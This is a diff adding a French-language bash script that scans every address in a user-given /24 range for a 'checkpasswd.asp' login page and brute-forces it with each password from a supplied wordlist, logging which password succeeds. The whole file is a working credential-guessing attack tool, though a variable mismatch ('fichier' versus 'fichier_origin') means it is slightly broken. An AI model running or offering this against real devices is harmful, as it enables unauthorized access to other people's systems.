@@ -1,0 +1,25 @@
+echo "Donner la plage d'IP :";
+read ip; fin=$(echo $ip | cut -d . -f 4); 
+taille_fin=$(echo ${#fin}); 
+taille_ip=$(echo ${#ip}); 
+addresse_deb=$(echo ${ip:0:($taille_ip-$taille_fin)}); 
+echo "Donner le fichier de mot de passe :";
+read fichier; 
+i=0; 
+while [ $i -le 255 ]; 
+	do if [$(timeout 5s curl -L http://$addresse_deb$i/checkpasswd.asp | grep body) -z ]; 
+		then echo "$addresse_deb$i - IP non attribuee"; 
+	else $(cat $fichier_origin | tr -d '\r' > fichier.txt);
+		for LIGNE in $(cat fichier.txt); 
+			do curl_login=$(curl --data passw=$LIGNE -L http://$addresse_deb$i/checkpasswd.asp | grep window); 
+			if [[ $curl_login == *jdpass.asp* ]]; 
+				then  echo "$addresse_deb$i - tente : $LIGNE "; 
+			elif [[ $curl_login == *user.asp* ]]; 
+				then echo "$addresse_deb$i - trouve : $LIGNE"; 
+				break ; 
+			else echo "$addresse_deb$i - bug" ; 
+			fi ;  
+		done ; 
+	fi; 
+	let i++ ; 
+done >  resultat_brute_force_mdp.txt
